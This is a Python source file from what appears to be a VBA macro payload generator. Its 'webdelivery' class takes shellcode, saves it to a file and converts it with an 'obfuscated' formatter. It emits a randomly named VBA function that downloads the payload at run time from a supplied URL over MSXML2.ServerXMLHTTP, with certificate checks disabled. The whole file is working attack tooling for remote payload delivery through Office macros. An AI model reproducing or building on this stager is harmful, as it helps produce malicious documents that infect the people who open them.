import random
import string
from vba.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.shellcodeType = type(shellcode).__name__
        if self.shellcodeType == "str":
            open(outfile, 'w').write(shellcode)
        elif self.shellcodeType == "bytes":
            open(outfile, 'wb').write(shellcode)
        elif self.shellcodeType == "list":
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Output saved to {outfile}')
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_vba'](shellcode, 'obfuscated')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:

        codeblock = f"""
Private Function {self.name}()
    Dim http As Object
    Dim url As String
    Dim response As String
    
    ' Define your endpoint URL
    url = "{self.url}"
    
    ' Create the HTTP object (MSXML2 is built into Windows)
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    
    http.setOption 2, 13056

    ' Open the connection: Method, URL, Asynchronous (False = Wait for response)
    http.Open "GET", url, False
    
    ' Optional: Set headers if your target API requires them
    http.setRequestHeader "Accept", "application/json"
    
    ' Send the request
    http.send
"""


        if self.shellcodeType == 'bytes':
            codeblock += f"""
    {self.name} = http.responseBody
End Function
"""
        elif self.shellcodeType == 'str':
            codeblock += f"""
    {self.name} = http.responseText
End Function
"""
        elif self.shellcodeType == 'list':
            codeblock += f"""
    Dim lines() As String
    lines = Split(http.responseText, vbLf)
    {self.name} = lines
End Function
"""

        return codeblock
